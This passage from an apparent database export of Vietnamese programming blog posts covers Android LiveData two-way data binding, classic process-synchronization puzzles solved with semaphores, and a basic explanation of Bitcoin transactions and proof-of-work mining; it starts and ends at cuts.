cập nhật với một giá trị mới. Tuy nhiên, để nó biết khi nào và làm sao thuộc tính tahy đổi chúng ta phải đưa vào một event tùy biến. Việc đặt tên các sự kiện mặc định cho thuộc tính sẽ bắt đầu với tiền tố **"AttrChanged"**. Trong trường hợp của chúng ta ní là **currentTabAttrChanged**.\n```\ncompanion object {\n   @BindingAdapter("currentTab")\n   @JvmStatic \n   fun setTab(pager: ViewPager, itemLiveData: MutableLiveData<Int>){\n       itemLiveData.value?.let { \n          //don't forget to break possible infinite loops!\n          if (pager.currentItem != itemLiveData.value) {      \n              pager.setCurrentItem(itemLiveData.value, true)\n          }\n       }\n   }\n    @InverseBindingAdapter(attribute = "currentTab", event =                     "currentTabAttrChanged")\n    @JvmStatic\n    fun getTab(pager: ViewPager) = pager.currentItem\n}\n```\n\n\n### A Word of Warning.\n\nCẩn thận đừng để bị rơi vào vòng lặp vô hạn của việc sử dụng two-way databinding. Khi người dùng thay đổi một thuộc tính, phương thức được đánh dấu **@InverseBindingAdapter** được gọi. Điều này, theo thứ tự, có thể gọi phương thức được đánh dấu **@BindingAdapter**, cái sẽ gây ra một lời gọi khác nhằm tới phương thức được đánh dâu **@InverseBindingAdapter**, và cứ thế....\n\nVì lý do này, nó là quan trọng nhằm thoát khỏi vòng lặp bằng cách so sánh giá trị cũ và mới trong phương thức được đánh dấu **@BindingAdapter**.\n\n### Some Final Thoughts.\n\nVòng đời của các thành phần Android là rất phức tạp và có thể được dẫn tới sự cực nhọc khi quản lý bằng tay bởi quá trình giữ cho UI được cập nhật cùng với dữ liệu tài nguyên, do đó việc giới thiệu LiveData là một bước tiến lớn trong việc quản lý vòng đời. Quá trình thêm vào data binding cho project có thể làm cho mã nguồn trở nên ngắn gọn hơn cũng như phản ứng với những thay đổi của dữ liệu tài nguyên có thể được lan truyền một cách tự động tới UI bất chập sự thay đổi cấu hình hoặc trạng thái vòng đời. Tuy nhiên, quá trình sử dụng data binding của bạn không nên bị giới hạn bởi chỉ thiết lập một dữ liệu thuộc tính của model tới text fields. Data Binding với LiveData sử dụng one- hay two-way binding sẽ cho phép bạn tận dụng tối đa mô hình Observer và Lifecycle Aware.\n\n## Source\nhttps://proandroiddev.com/advanced-data-binding-binding-to-livedata-one-and-two-way-binding-dae1cd68530f\n## Reference\nhttps://developer.android.com/topic/libraries/data-binding/two-way	Introduction\n\nData Binding ngày càng phổ biến hơn trong quá trình phát triển các ứng dụng Android bởi vì nó được gia tăng lợi ích bởi kiến trúc MVVM. Nó cho phép bạn bind các thành phần UI trong layouts của mình với các nguồn dữ liệu trong ứng dụng sử dụng một cấu trúc định nghĩa sẵn hơn là việc lập trình. Tự động thông báo về các thay đổi dữ liệu cho UI và nhận lại những thay đổi thuộc tính củ...	{}	1	Android Data Binding: Binding to LiveData (One- and Two-Way Binding)	{databinding,android}	0	f	2022-12-18 15:33:38.405+00	2022-12-18 15:33:38.405+00
31905	# Đặt Vấn Đề\nNhư các bạn đã biết thì điều phối tiến trình là một vấn đề quan trọng trong quá trình xử lý các tiến trình làm\nviệc trên máy tính. Các thuật toán để điều phối tiến trình phải đảm bảo các tiêu chuẩn như:\n1. Sử dụng CPU (Lớn nhất)\n    * Mục đích của điều độ là làm CPU hoạt động nhiều nhất có thể.\n    * Độ sử dụng CPU thay đổi từ 40%(Hệ thống tải nhẹ) đến 90%(Hệ thống tải nặng).\n2. Thông lượng(Lớn nhất)\n    * Số lượng tiến trình hoàn thành trong một đơn vị thời gian.\n        * Các tiến trình dài: 1 tiến trình/giờ\n        * Các tiến trình ngắn: 10 tiến trình/giây\n3. Thời gian hoàn thành (Nhỏ nhất)\n* Khoảng thời gian từ thời điểm gửi đến hệ thống tới khi quá trình hoàn thành.\n    * Thời gian chờ đợi để đưa vào bộ nhớ\n    * Thời gian chờ đợi trong hàng đợi sẵn sàng\n    * Thời gian chờ đợi trong hàng đợi thiết bị\n    * Thời gian thực hiện thực tế\n4. Thời gian chờ đợi(Nhỏ nhất)\n    * Tổng thời gian chờ đợi trong hàng đợi sẵn sàng (Giải thuật điều độ CPU không ảnh hưởng tới các tiến\n    trình đang thực hiện hay đang đợi thiết bị vào ra)\n5. Thời gian đáp ứng(Nhỏ nhất)\n    * Từ lúc gửi câu hỏi cho đến khi câu trả lời đầu tiên được tạo ra\n        * Tiến trình có thể tạo ra kết quả từng phần.\n        * Tiến trình vẫn tiếp tục tính toán kết quả mới trong khi kết quả cũ vẫn gửi tới người dùng.\n <br>\nTrong bài này, mình xin đưa ra 5 ví dụ về điều phối tiến trình, trong mỗi cái mình chỉ ra rõ:\n    * Nguồn gốc.\n    * Vấn đề đặt ra.\n    * Thuật toán.\n\n# Một số ví dụ về điều phối tiến trình\n## 1. Đường Ray ở Andes (Railways in the Andes)\n### Vấn đề thực tiễn\nMột dãy núi cao ở Andes, ở đó có 2 tuyến đường sắt tròn. Một đường ở Peru, một cái khác ở Bolivia. Họ cùng dùng\nchung , một phần của đường ray, nơi mà các đường băng qua một đèo núi nằm trên biên giới quốc tế(Gần hồ Titicaca).\n<br>\n![](https://images.viblo.asia/3b447e92-5424-4c50-9fff-a76d7fef3e8c.png)\n<br>\n Thật không may mắn, các đoàn tàu của Peru và Bolivian thỉnh thoảng va chạm nhau khi đồng thời đi vào phần\nchung của đường ray (đèo núi). Vấn đề là những người lái xe của cả hai tàu đều bị mù và điếc, do đó họ không thể\nnhìn thấy hay nghe thấy nhau. <br>\nHai người lái tàu đã thống nhất về phương pháp ngăn ngừa va chạm sau đây. Họ đặt một bát lớn ở lối vào đèo.\nTrước khi vượt qua, người lái xe phải dừng tàu, đi qua bát, và chạm vào nó để thấy nó có chứa một tảng đá hay\nkhông. Nếu bát trống, người lái xe phải tìm một hòn đá và bỏ nó vào bát, cho biết chuyến tàu của mình đang đi qua;\nMột khi đoàn tàu của ông đã vượt qua được, ông phải đi bộ trở lại bát và loại bỏ đá của ông, để báo hiệu rằng chỗ\ndùng chung đó không có ai sử dụng nữa. Cuối cùng, anh ta quay trở lại tàu và tiếp tục lái xe. <br>\nNếu người lái xe kia lái xe đến đèo tìm thấy trong bát có một hòn đá thì người đó phải rời chỗ chung đường ray\nđó để tránh va chạm. Do vậy anh ta phải cho đoàn tài nghỉ ngơi và kiểm tra lại cái tô cho đến khi thấy nó trống rỗng.\nSau đó anh ta bỏ 1 hòn đá vào tô và cho tàu anh ta vào đèo. Một sinh viên thông minh đến từ đại học LaPaz (Bolivia)\ncho rằng cái cách này có thể làm cho chặn đường tàu mãi mãi. Nhưng người lái xe ở Bolivia chỉ cười và nói rằng điều\nđó không thể đúng bởi vì nó không bao giờ xảy ra.<br>\nThật không may, vào một ngày cả 2 đàu đâm vào nhau.<br>\nSau vụ tai nạn. Sinh viên đó được gọi đến để tư vấn để đảm bảo răng sẽ không xảy ra tai nạn nữa. Anh ấy nói rằng\ncái bát đã được sử dụng sai cách. Người lái xe ở Bolivia phải đợi tại lối vào đèo cho đến khi cái bát trống, lái xe qua\nđèo và đi bộ trở lại để đặt một tảng đá vào bát. Người lái xe người Peru phải chờ đến khi bát có chứa đá, lái xe qua\nđèo và đi bộ để lấy tảng đá khỏi bát. Chắc chắn, phương pháp của ông ngăn ngừa tai nạn. Trước khi sắp xếp này, tàu\ncủa Peru chạy hai lần một ngày và tàu Bolivian chạy mỗi ngày một lần. Người Peru rất không hài lòng với cách sắp\nxếp mới.<br>\nDo đó, sinh viên này được kêu gọi trở lại và được yêu cầu tìm giải pháp khác để ngăn ngừa được tai nạn và tránh\nđược vấn đề phương pháp trước đây. Sau một thời gian suy nghĩ, sinh viên này đã đề nghị răng nên sử dụng 2 cái bát,\nmột cho mỗi người lái tàu, và cách thức hoạt động như sau: Khi lái xe đến chỗ vào đầu tiên anh ta thả hòn đá vào tô\ncủa mình sau đó kiểm tra cái tô khác để xem nó có hòn đá nào không. Nếu nó trống thì anh ta lái xe của mình thông\nqua đường chuyền. Sau đó dừng lại và đi trở lại để loại bỏ hòn đá của mình. Nhưng nếu anh ta tìm thấy một hòn đá\ntrong bát khác thì anh ta trở lại bát của mình và lấy đá của mình ra.Tiếp theo, anh ta nghỉ ngơi và đợi cho đến lúc\ncho cái bát kia trống rỗng và bỏ hòn đá vào tô của mình... Phương pháp này hoạt động tốt cho đến cuối tháng 5, khi\nhai chuyến tàu đồng thời bị chặn tại cửa khẩu.<br>\n### Phân tích vấn đề.\nSau đây chúng ta cùng tìm hiểu thuật toán của bài toán này sao cho nó hiệu quả nhất. Thực ra nếu để ý kĩ thì bạn thấy đây là một bài toán có dạng như producer- consumer. Nhưng bây giờ chúng ta sẽ làm nó với signals và waits.<br>\nBINARYSEMAPHONE                       mutex=1 <br>\nCOUNTINSEMAPHORE                   empty = n;                full=0;<br>\nTa xem mutex là cái đèn báo, và ở đây ta quy về bài toán producer – consumer. Do đó ta có thuật toán sau đây:<br>\n    Procedure: <br>\n    ![](https://images.viblo.asia/aac5e8c2-9a5c-47c0-aa2e-f7837d35d414.png)\n    <br>\n    Customer:\n    <br>\n    ![](https://images.viblo.asia/50bd0135-95b9-4b71-b207-4d3048d0e387.png)\n\n## 2. Vấn đề của người hút thuốc lá(Cigarette Smoker’s Problem)\n### Vấn đề thực tiễn\nLần đầu tiên được trình bày bởi Suhas Patil in 1971.<br>\nCó 4 người trong vấn đề này: 3 người hút thuốc lá và một người đại lý. .Mỗi người hút thuốc lá sẽ trải qua 2 quá\ntrình là làm thuốc lá và hút thuốc. Để làm ra một điếu thuốc thì yêu cầu phải có thuốc lá(tobacco) , giấy và diêm.Mỗi\nngười hút thuốc lá có vô hạn 1 trong 3 cái: Thuốc lá, hoặc giấy hoặc diêm . Người đại lý có một nguồn vô tận của cả\nba. Người đại lý sẽ chọn ngẫu nhiên 2 trong 3 món đồ đó đặt lên trên bàn. Còn người hút thuốc có thể lấy 2 cái trên\nbàn đó , với điều kiện là 2 cái đó khác với cái mình đang có để làm ra 1 điếu thuốc và sau đó hút.<br>\nỞ đây thì người đại lý bán thuốc đại diện cho hệ điều hành, còn người hút thuốc đại diện cho tiến trình.\nNgười bán thuốc muốn phân bố các nguồn nhân lực cần thiết cho các quá trình và tránh trường hợp rơi vào bế\ntắc.<br>\n![](https://images.viblo.asia/6e810e0e-7123-4866-9154-1ca1fd53f1f9.png)\n<br>\nVí dụ: Người A có giấy, người B có thuốc lá, và người C có diêm . Nếu người đại lý đưa ra giấy và thuốc(tobacco) thì\nngười A và B sẽ không tạo được thuốc lá do thiếu diêm.\n### Giải pháp (Solution)\nSau đây là một giải pháp khá dễ dàng . Cả 3 người sẽ làm được điếu thuốc lá và hút nó. Nếu người nào không làm\nđược điếu thuốc thì sẽ ngồi nghỉ 1 chỗ nào đó (Sleep) . Khi người đại lý đặt hai vật lên trên bàn, và sẽ kêu (Wake up)\nngười tương ứng có thể tạo ra thuốc để hút, sau đó thì đi ngồi nghỉ tiếp. Sau đây sẽ là thuật toán giải quyết vấn đề này.\n##### Thuật toán cho người đại lý:\n![](https://images.viblo.asia/0279767b-36eb-4e4f-8f35-84a587876cff.png)\n##### Thuật toán của người hút thuốc:\n![](https://images.viblo.asia/7ee52c0c-9fe7-45ea-8a06-3ff936180a3f.png)\n<br>\nNgười hút thuốc ngay lập tức ngủ, khi người đại lý đưa 2 vật lên bàn, sau đó đại lý sẽ đánh thức người hút thuốc\ntương ứng. Người hút thuốc sau đó sẽ lấy đồ vật và đánh thức các đại lý. Trong khi người hút thuốc lá đang hút,\nngười đại lý có thể đaẹt hai vật lên bàn và đánh thức một người khác (Nếu vật người đó có không giống với 2 đồ vật\ntrên bàn). Người đại lý ngủ ngay lập tức sau khi đặt các vật ra. Giải thuật này giống với vấn đề Producer-Consumer\n.Ngoại trừ Producer chỉ có thể sản xuất 1 mặt hàng (Mặc dù lựa chọn 3 mặt hàng) cùng 1 lúc.\n## 3. Ông già Noel (Bài toán Santa claus)\nĐây là một vấn đề được lấy từ sách Hệ điều hành của William. Nhưng được cho là của ông John Trono, ở trường\nđại học Michael ở Vermont\n### 1. Vấn đề thực tiễn\nSanta Claus đang ngủ ở trong cửa hàng của ông ấy ở Bắc Cực, ông ấy chỉ có thể được đánh thức bởi:\n<br>\n1. Cả 9 con tuần lộc trở về từ kì nghỉ hè ở Thái Bình Dương\n2. 3 trong số các chú lùn gặp khó khăn trong việc làm đồ chơi đến nhờ ông già Noel giúp.<br>\nMột số lưu ý trong bài toán này:\n    * Khi 3 chú lùn đang nhờ ông già Noel giúp, bất kì chú lùn nào đến gặp ông già Noel phải đợi những chú lùn kia trở về.\n    * Nếu ông già Noel thức dậy nhìn thấy 3 chú lùn ở ngoài cửa cùng với con tuần lộc cuối cùng trở về từ vùng nhiệt\n    đới thì những chú lùn có thể phải đợi đến sau giáng sinh, bởi vì việc quan trọng lúc này là chuẩn bị các xe trượt\n    tuyết.\n    * Giả thiết rằng các con Tuần Lộc không muốn rời khỏi vùng nhiệt đới, muốn ở lại đó đến giây phút cuối cùng có\n    thể.\n    * Con Tuần Lộc cuối cùng đến nơi phải đón ông già Noel trong khi những con khác chờ đợi trong một túp lều\n     nóng lên trước khi được đưa vào xe trượt tuyết.\n### 2. Phân tích\n* Sau khi con tuần lộc thứ 9 đến, ông già noel phải chuẩn bị xe trượt tuyết (prepareSleigh) , và sau đó cả 9 con\ntuần lộc phải được buộc dây thừng (getHitched)\n* Nếu trường hợp ông gìa Noel thức giấc chỉ có 3 chú lùn, ông già Noel phải giúp đỡ các chú lùn (helpElves), và\nđiều đó cũng có nghĩa là các chú lùn được giúp đỡ (getHelp).\n* Tất cả 3 chú lùn phải được giúp đỡ trước khi chú lùn nào khác được bổ sung.\n### 3. Giải pháp cho bài toán\n**Khởi tạo**\n<br>\n![](https://images.viblo.asia/e86f31a0-3d71-4676-8f99-3543d14ce3d2.png)\n<br>\n**Ông già Noel (Santa Claus)**\n<br>\n![](https://images.viblo.asia/4a3f2a59-7712-4ee0-bda2-b482ee85fde1.png)\n<br>\n**Reindeer**\n<br>\n![](https://images.viblo.asia/7ab8a9d3-726d-46a1-95f3-eea3277750c0.png)\n<br>\n**Elves**\n<br>\n![](https://images.viblo.asia/8dcf0a71-018c-4332-9556-4cb0d7374635.png)\n<br>\n## 4. Vấn đề vượt sông (River Crossing Problem)\n### Vấn đề thực tiễn\nĐây là vấn đề được viết bởi Anthony Joseph ở U.C.Berkeley . Nhưng không xác định chính xác ai là tác giả của\nbài toán này. Nó tương tự như vấn đề của bài toán tạo phần tử nước theo nghĩa nó là loại rào cản đặc biệt chỉ cho\nphép các luồng truyền qua các kết hợp nhất định.<br>\nMột nơi nào đó gần Redmond, Washington có một chiếc thuyền buồm chở hàng được sử dụng bởi cả tin tặc\n(Hacker) làm việc cho Linux và nhân viên của Microsoft để chuyển họ qua sông. Phà có thể giữ 4 người , nó sẽ không\nrời bờ với nhiều hoặc ít hơn số lượng vừa nói trên. Để đảm bảo an toàn cho khách hàng thì không cho phép đưa một\nhacker vào thuyền với ba.<br>\n### Hướng giải quyết (Solution)\n1. Ở đây với mọi người lên thuyền mình sử dụng hàm BoardBoat() Các tình huống đó với 3 nhân viên và 1 hacker,\nhoặc ngược lại.<br>\n2. Khi chiếc thuyền chở đúng số người , thì mỗi người ở trên đó gọi là hàm RowBoat().<br>\n3. Chỉ một người có thể truy cập thuyền tại một thời điểm nhất định.<br>\n4. Hacker và nhân viên ở bên ngoài thuyền đợi , ta sẽ sử dụng các biến để biểu diễn các sự kiện này waitingToBoardH\nvà waitingToBoardE. Người ở trong thuyền sẽ đợi tàu rời đi, ta sử dụng biến waitingToRow để biểu diễn sự kiện\nnày.<br>\n5. Thứ nhất, cần phải biết số lượng hackers đang chờ đợi để được chỉ định cho một thuyền ( int wH) và số\nlượng nhân viên chờ đợi để được giao cho một thuyền (int wE). Cũng cần phải biết số lượng tin tặc chưa lên\ntàu nhưng đã được chỉ định cho thuyền (int aH) và số lượng nhân viên đó (int aE). Cuối cùng , người cuối cùng\ntrong thuyền cần phải xếp hàng , vì vậy cần phải biết số người trên thuyền (int inBoat). Tất cả các biến này\nđều được khởi tạo thành 0.<br>\n**Thuật toán giải**\n<br>\n![](https://images.viblo.asia/b6c8d87d-d67b-43f8-bf28-d8a6b100f3e9.png)\n<br>\n![](https://images.viblo.asia/c31a1c76-25e8-46e6-877f-1ea9e6e017b0.png)\n## 5. The dining savages problem\n### Vấn đề thực tiễn\nVấn đề này từ quyển Concurrent Programming của Andrews.<br>\nMột bộ tộc hoang dã ăn tối chung từ một cái nồi lớn có thể chứ được M khẩu phần ăn được nấu chín. Khi một người\nmuốn ăn anh ấy sẽ tự lấy ở nồi nếu còn. Nếu nồi rỗng , người ấy đánh thức đầu bếp dậy và đợi cho đến khi đầu bếp\ncho thức ăn vào nồi.\n### Phân tích và giải pháp\nTất cả các thành viên của bộ tộc đều sử dụng hàm lấy thức ăn:<br>\n![](https://images.viblo.asia/eb69b807-819e-428d-be11-44f4d37d9339.png)\n<br>\nMột tiến trình nấu ăn sẽ chạy lệnh:<br>\n![](https://images.viblo.asia/dd1779c0-75e9-402d-bdf7-66f6c9aad864.png)\n<br>\n**Điều kiện ràng buộc giữa các tiến trình là:**\n<br>\n* Người không thể lấy thức ăn (chạy hàm getDervingFromPot()) nếu nồi rỗng.\n* Đầu bếp chỉ có thể bỏ thêm thức ăn (chạy hàm putServingInPot())khi nồi rỗng.\nChúng ta sử dụng biến đếm servings để đếm số lượng thức ăn còn lại trong nồi. Nếu servings =0 thì đầu bếp sẽ chạy\nhàm putServingInPot() . Đèn bào emptyPot để chỉ nồi rỗng và fullPot để chỉ nồi đã đầy.\n![](https://images.viblo.asia/cc16cced-efac-4dd0-8816-82900839ce11.png)\n<br>\nNgười nấu ăn:<br>\n![](https://images.viblo.asia/18a62ed4-bbb8-4309-8967-e694bd2b03fe.png)\n<br>\nKhí có tín hiệu báo nồi đã rỗng thì cook sẽ thực hiện hàm putServingsInPot() để đưa thêm thức ăn vào nồi. Khi nồi\nđầy sẽ chạy tiến trình fullPot.signal().// Savage (người trong bộ tộc)://\n<br>\n![](https://images.viblo.asia/07e7a744-467f-46c7-bcb6-0e5413507142.png)\n<br>\nMỗi thành viên trong bộ tộc sẽ phải đợi đèn hiệu mutex để được lấy thức ăn. Nếu nhận thấy nồi rỗng thì sẽ đợi cho\nđến khi tín hiệu nồi đầy (fullPot) từ tiến trình Cook để thiết lập biến chỉ số lượng thức ăn trong nồi là servings = M\nvà chạy tiếp chương trình. Mỗi tiến trình sẽ lấy một khẩu phần ăn từ nồi và giảm biến đếm đi 1 đơn vị . Sau khi lấy\nxong tiến trình này sẽ trả lại mutex cho các tiến trình đang đợi khác và thực hiện hàm eat().\n<br>\n# TÀI LIỆU THAM KHẢO\n1. The Little Book of Semaphores. Allen B. Downey. Version 2.1.5.\n2.  Synchronization Problem Solutions https://inst.eecs.berkeley.edu/cs162/fa13/hand-outs/synch-solutions.html.\n3.  https://web.cs.wpi.edu/cs3013/c07/lectures/Section06-Sync.pdf.\n4.  https://www.youtube.com/watch?v=M_G6nDtQarg	Đặt Vấn Đề\nNhư các bạn đã biết thì điều phối tiến trình là một vấn đề quan trọng trong quá trình xử lý các tiến trình làm\nviệc trên máy tính. Các thuật toán để điều phối tiến trình phải đảm bảo các tiêu chuẩn như:\n1. Sử dụng CPU (Lớn nhất)\n    * Mục đích của điều độ là làm CPU hoạt động nhiều nhất có thể.\n    * Độ sử dụng CPU thay đổi từ 40%(Hệ thống tải nhẹ) đến 90%(Hệ thống tải nặng).\n2. Thôn...	{https://images.viblo.asia/3b447e92-5424-4c50-9fff-a76d7fef3e8c.png,https://images.viblo.asia/aac5e8c2-9a5c-47c0-aa2e-f7837d35d414.png,https://images.viblo.asia/50bd0135-95b9-4b71-b207-4d3048d0e387.png,https://images.viblo.asia/6e810e0e-7123-4866-9154-1ca1fd53f1f9.png,https://images.viblo.asia/0279767b-36eb-4e4f-8f35-84a587876cff.png,https://images.viblo.asia/7ee52c0c-9fe7-45ea-8a06-3ff936180a3f.png,https://images.viblo.asia/e86f31a0-3d71-4676-8f99-3543d14ce3d2.png,https://images.viblo.asia/4a3f2a59-7712-4ee0-bda2-b482ee85fde1.png,https://images.viblo.asia/7ab8a9d3-726d-46a1-95f3-eea3277750c0.png,https://images.viblo.asia/8dcf0a71-018c-4332-9556-4cb0d7374635.png,https://images.viblo.asia/b6c8d87d-d67b-43f8-bf28-d8a6b100f3e9.png,https://images.viblo.asia/c31a1c76-25e8-46e6-877f-1ea9e6e017b0.png,https://images.viblo.asia/eb69b807-819e-428d-be11-44f4d37d9339.png,https://images.viblo.asia/dd1779c0-75e9-402d-bdf7-66f6c9aad864.png,https://images.viblo.asia/cc16cced-efac-4dd0-8816-82900839ce11.png,https://images.viblo.asia/18a62ed4-bbb8-4309-8967-e694bd2b03fe.png,https://images.viblo.asia/07e7a744-467f-46c7-bcb6-0e5413507142.png}	1	MỘT SỐ VÍ DỤ VỀ ĐIỀU PHỐI TIẾN TRÌNH TRONG THỰC TẾ	{hedieuhanh,dieuphoitientrinh}	0	f	2022-12-18 15:33:38.434+00	2022-12-18 15:33:38.434+00
31906	# Giới Thiệu\n- Hiện nay với sự phát triển của thị trường **tiền điện tử**(Crypocurrency) , việc mua vào các bitcoin là một ý tưởng tuyệt vời nếu bạn là một nhà đầu tư và có niềm tin là nó sẽ còn tiếp tục lên. Nhưng bạn đã bao giờ tự hỏi vậy các **giao dịch**(transaction) bitcoin này hoạt động như thế nào. Để trả lời cho câu hỏi này chúng ta sẽ đi vào các đặc điểm cơ bản của một transaction bitcoin.\n\n- Các transaction bitcoin được gửi và nhận giữa những ví điện tử bitcoin, chúng được đăng ký bằng kỹ thuật số để đảm bảo an toàn. Mọi người trong network có thể biết về thông tin của các transaction cũng như là lịch sử của chúng, khi truy nguyên nguồn gốc mà bitcoin được sản xuất. Tuy nhiên, họ không thể thay đổi bất kỳ dữ liệu nào trên transaction mà chỉ có thể ghi nhận thành một dữ liệu khác (tính minh bạch hoàn toàn).\n\n# Đi Vào Các Đặc Điểm\n### 1. Thực tế mỗi tài khoản chả chứa một đồng bitcoin nào cả\n- Trên thực tế bitcoin không hề tồn tại ở bất cứ đâu. Chúng ta nhắc đến các bitcoin, ông A có 10bitcoin, bà B có 20bitcoin nhưng khi bạn nhìn vào một địa chỉ bitcoin cụ thể nó không thật sự có Bitcion hữu hình nào trong đó cả, thực chất lượng bitcoin đó được tính bằng cách tính tổng tất cả giá trị của các đầu ra của các transaction trước đó mà có địa chỉ thụ hưởng trỏ đến địa chỉ của ông A hay ông B mà thôi.\n\n- Nó tuân theo quy tắc đầu ra của transaction này sẽ là đầu vào của transaction khác như hình minh họa bên dưới:\n\n![](https://images.viblo.asia/8edf951b-ad6c-4bb7-b67c-8f60fc1e08c0.png)\n\n- Giống như việc chúng ta tiêu tiền giấy vậy, số tiền ta có thực chất là tiền mà ta được người khác đưa cho và tổng đống tiền đó lại ta có số tiền ta đang có. Sẽ có nhiều dạng transaction có dạng 1 đầu vào 1 đầu ra, 1 đầu vào nhiều đầu ra, nhiều đầu vào và 1 đầu ra và v.v.. nó sẽ có dạng chung thường như thế này\n\n![](https://images.viblo.asia/cbdbd442-80a2-4911-b9f4-2e3d85248d6e.png)\n\n- Tức là một khoản để thanh toán và nếu số tiền đó còn thừa sẽ được tạo thành một transaction trả lại tiền thừa, nó cũng giống như ta mua hàng ở siêu thị và được thu ngân trả lại tiền thừa. Lúc này output 0 sẽ là transaction dùng để thanh toán nó sẽ có thể sử dụng cho lần chi tiêu tiếp theo của Bob và tiền thừa trả về ví của Alice là output 1 kia cũng có thể sử dụng cho lần tiếp theo. Còn các transaction đưa vào Input 1 sẽ không còn được sử dụng nữa.\n\n- Vì vậy nên thực chất số bitcoin có ở trong ví chỉ là nó đi tìm những transaction vẫn chưa được sử dụng mà có địa chỉ thụ hưởng trỏ về địa chỉ của ví mình và tính tổng giá trị của chúng sẽ ra số bitcoin người giữ ví đó đang có.\n\n### 2. Giao dịch bitcoin trông sẽ như thế nào?\n- Nếu Alice gửi một vài bitcoin cho Bob, giao dịch đó sẽ có ba phần thông tin:\n    + Một, thông tin đầu vào: Những địa chỉ bitcoin được Alice sử dụng để nhận bitcoin trước đây.\n    + Hai, khoản tiền: Đây là số lượng bitcoin mà Alice gửi cho Bob.\n    + Ba, thông tin đầu ra: Địa chỉ bitcoin của Bob.\n![](https://images.viblo.asia/b4a722a1-b7a0-4088-9117-739ed2678d87.png)\n\n### 3. Nó sẽ được gửi đi như thế nào ?\n- Sau khi ví lấy được các transaction có địa chỉ của Alice mà chưa được sử dụng và để đem vào thanh toán trong transaction với Bob thì trasaction mới sẽ được tạo thành rồi đưa lên mạng bitcoin.\n\n- Như đã biết mỗi địa chỉ trong bitcion sẽ chứa 2 khóa là **khóa công khai** (public key) và **khóa bí mật** (private key). Hai khóa này có liên quan đến nhau nhưng sẽ không có cách nào có thể từ public key tìm ra private key. Điều quan trong ở đây bây giờ là bất kỳ một transaction nào xuất phát từ địa chỉ của Alice sẽ cần **`ký`** với chữ ký được tạo ra từ private key của Alice. Vì private key là bí mật chỉ có Alice biết nên không ai có thể giảo mạo Alice để nhận số tiền đó. Một tính năng vô cùng tuyệt vời của bitcoin đó là **nếu chữ ký được tạo bằng private key tương ứng với public key đó, chương trình sẽ xác thực giao dịch mà không cần biết khóa riêng là gì. Rất thông minh.**\n\n- Mạng bitcoin sau đó xác nhận xem trước đây Alice đã sử dụng bitcoin đó chưa bằng cách chạy qua lịch sử địa chỉ của Alice để kiểm tra, điều này ví sẽ tự động làm ví nó đã viết địa chỉ của Alice và public key cùng vì tất cả các giao dịch đều công khai trên sổ cái bitcoin.\n\n### 4. Ai sẽ là người xác nhận giao dịch của bạn?\n- Đầu tiên, ví sẽ tiến hành kiểm tra nhanh giao dịch trên. Nó sẽ kiểm tra xem liệu Alice có đủ bitcoin trong tài khoản của mình hay không và địa chỉ của Bob cung cấp có phải là một địa chỉ bitcoin còn sử dụng được hay không.\n\n- Sau khi thông qua 2 bài kiểm tra trên, giao dịch này sẽ được đóng gói kèm với các giao dịch khác để tạo thành 1 khối (block).\n\n- Khối này di chuyển tới các miner bitcoin. Mục tiêu của các miner là xác thực khối đó và thêm nó vào Blockchain (đây là quá trình cập nhật sổ cái).\n\n- Giống như đời thực con người cần lao động để nhận lại thành quả có thể là tiền, lương thực,... Thì trong bitcoin cũng vậy để có được bitcoin các miner cần phải lao động. Để nhận được bitcoin các miner cần xác nhận các giao dịch được người dùng tạo ra, nếu xác nhận thành công giao dịch đó họ sẽ nhận được bitcoin. Đây chính là khái niệm **Proof of Work** (PoW) - bằng chứng công việc. Bitcoin sử dụng một bài toán rất khó giải nhưng dễ kiểm tra cho các block của mình, đó chính là băm khối đó với một hệ số nonce là độ khó của thuật toán tùy vào số lượng miner đào block nhằm đảm bảo đúng 10 phút sẽ có một block được xác thực. Công việc của các miner giờ là giải bài toán đó.\n\n- Để hiểu được điều này, chúng ta cần phải tìm hiểu về các giá trị hash. **Một giá trị hash (hash value) là một chuỗi ký tự gồm số và chữ đi kèm với nhau và trông như thế này: 1gwv7fpx97hmavc6inruz36j5h2kfi803jnhg**.\n\n- Một giá trị hash được tạo ra bằng cách xử lý dữ liệu thông qua một thuật toán gọi là hàm hash (hash function).\n\n- Hàm hash là một hàm số toán học (mathematical function) ánh xạ (mapping) từ dữ liệu có độ dài bất kỳ (arbitrary size) thành dữ liệu có độ dài cố định (fixed size).\n\n- Để dễ hiểu hơn, hãy xem nó như là các nguyên liệu để xay sinh tố. Bạn phải lấy nguyên liệu (chính là dữ liệu), cho nó vào máy xay (hàm hash) và bạn sẽ có được nước sinh tố (giá trị hash).\n\n- Hashing là quá trình diễn ra 1 chiều. Khi bạn đưa ai đó 1 giá trị hash, người đó không thể biến nó trở về dữ liệu đầu vào ban đầu, cũng giống như không thể biến nước sinh tố trở về các nguyên liệu gốc.\n\n![](https://images.viblo.asia/c67b5a00-c8e8-4864-b648-cf2765a48d2c.jpg)\n\n- Khi các miner nhận được một khối các giao dịch và tìm cách đưa vào Blockchain, họ đang sử dụng hàm hash để giải quyết câu đố dưới dạng mật mã.\n\n- Các miner tiền ảo sử dụng khối mới (bao gồm các giao dịch được đóng gói trong khối này) kết hợp với một dãy số được tạo ra ngẫu nhiên (gọi là tham số nonce), đưa nó vào hàm băm khối và sau đó nhận được một giá trị hash cụ thể.\n\n- Những gì mà một miner tiền ảo cố gắng thực hiện là tìm một giá trị hash bắt đầu với nhiều con số 0. Họ sẽ liên tục thử các dãy số nonce khác nhau cho đến khi đạt được giá trị hash cần thiết.\n\n- Quá trình tính toán thử và sai được trình bày trong bước 1 và bước 2 trong biểu đồ dưới đây.\n\n![](https://images.viblo.asia/c47021b5-9113-470e-b323-90ccb89af04a.jpg)\n\n- Tất cả miner tiền ảo đang trong một cuộc cạnh tranh khốc liệt để tìm ra giá trị hash chính xác đó. Điều này là vì miner nào tìm ra giá trị chính xác (bước 3) sẽ đưa giải pháp chính xác tới node nhỏ (bước 4) để được xác thực.\n\n![](https://images.viblo.asia/8fbc0b8b-8ac7-4e34-876d-a206afa5df76.jpg)\n\n- Khối mới được thêm vào Blockchain (bước 5), và miner giành chiến thắng sẽ được thưởng một số bitcoin.\n\n![](https://images.viblo.asia/2c26c1a4-4776-4e2b-a8dd-a731f297f9fa.jpg)\n\n- Giao dịch bitcoin của Alice giờ đã được ghi nhận vào Blockchain. Ví tiền bitcoin của Bob cũng có thêm bitcoin và số dư của ông Alice bị trừ đi bitcoin.\n\n- Sau đó, quá trình đào tiền ảo bắt đầu lại từ đầu, với một loạt các giao dịch được gói lại vào một khối mới, và tất cả miner tranh nhau tìm ra giá trị hash chính xác.\n\n### 5. Có 